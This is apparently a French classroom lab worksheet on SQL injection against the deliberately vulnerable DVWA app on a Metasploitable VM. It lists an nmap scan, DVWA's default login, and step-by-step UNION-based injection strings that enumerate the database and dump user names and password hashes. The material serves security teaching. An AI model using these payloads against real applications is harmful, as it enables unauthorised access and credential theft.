@@ -1,0 +1,37 @@
+TP SQLi
+
+
+Metasploit : 192.168.43.144
+KaliLinux : 192.168.43.229
+
+
+nmap -p1-65535 192.168.43.144 -O --osscan-guess
+
+
+
+DVWA : 
+	user : admin
+	password : password
+	
+	
+2) Obtenir DB version : 1' UNION select null, version() #
+	
+	
+4)	Obtenir le nom de la bse de données utilisée : 1' union select @@version,database() #
+	
+	
+5)	Obtenir le nombre de tables : 1' union Select null, COUNT(table_name) FROM information_schema.tables #
+	
+	
+6)	1' union Select null, table_name FROM information_schema.tables WHERE table_name LIKE 'user%' #
+
+7) Oui il existe une table 'users'
+
+Extraction des noms des colonnes : 1' UNION SELECT null, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'#
+
+On peut en tirer le prénom, nom de famille, l'username, le mot de passe et l'avatar des utilisateurs
+
+
+Récuperer les users et password : 1' UNION SELECT user, password FROM users #
+
+L'utilisation d'un hash d'un md5 permet d'éviter de stocker les mots de passe en claire. Cela peut également permettre d'éviter de faire transiter sur le réseau les mdp en claire
